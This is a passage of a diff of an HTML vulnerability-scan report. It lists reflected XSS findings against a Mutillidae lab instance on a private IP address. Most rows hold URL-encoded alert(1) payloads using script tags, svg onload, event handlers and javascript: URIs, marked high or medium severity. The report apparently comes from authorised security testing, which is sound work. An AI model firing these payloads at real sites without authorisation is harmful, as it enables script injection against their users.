+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -526,13 +673,6 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%3Dalert%281%29%253E </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
@@ -540,7 +680,7 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -548,6 +688,13 @@
                     <tr>
                       <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?page=%22+onmouseover%3Dalert%281%29+x%3D%22 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -568,13 +715,6 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B+autofocus+onfocus%3Dalert%281%29+%26%23x27%3B </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
@@ -582,7 +722,14 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%253Balert%25281%2529%253B%2F%2F </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -596,7 +743,7 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%253Balert%25281%2529%253B%2F%2F </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -617,6 +764,13 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%3Aalert%281%29 </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%253Aalert%25281%2529 </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
@@ -624,7 +778,294 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%25281%2529%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%281%29%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bsvg%2Fonload%3Dalert%281%29%26gt%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Csvg%2Fonload%3Dalert%281%29%3E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%3Dalert%281%29%253E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%22+onmouseover%3Dalert%281%29+x%3D%22 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26quot%3B+onmouseover%3Dalert%281%29+x%3D%26quot%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%2520autofocus%2520onfocus%253Dalert%25281%2529%2520%2527 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B+autofocus+onfocus%3Dalert%281%29+%26%23x27%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%253Balert%25281%2529%253B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27%3Balert%281%29%3B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%281%29 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%25281%2529 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%3Aalert%281%29 </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%253Aalert%25281%2529 </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%25281%2529%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%281%29%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bsvg%2Fonload%3Dalert%281%29%26gt%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Csvg%2Fonload%3Dalert%281%29%3E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%3Dalert%281%29%253E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%22+onmouseover%3Dalert%281%29+x%3D%22 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26quot%3B+onmouseover%3Dalert%281%29+x%3D%26quot%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%2520autofocus%2520onfocus%253Dalert%25281%2529%2520%2527 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B+autofocus+onfocus%3Dalert%281%29+%26%23x27%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%253Balert%25281%2529%253B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27%3Balert%281%29%3B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%281%29 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%25281%2529 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%3Aalert%281%29 </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%253Aalert%25281%2529 </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
                     </tr>
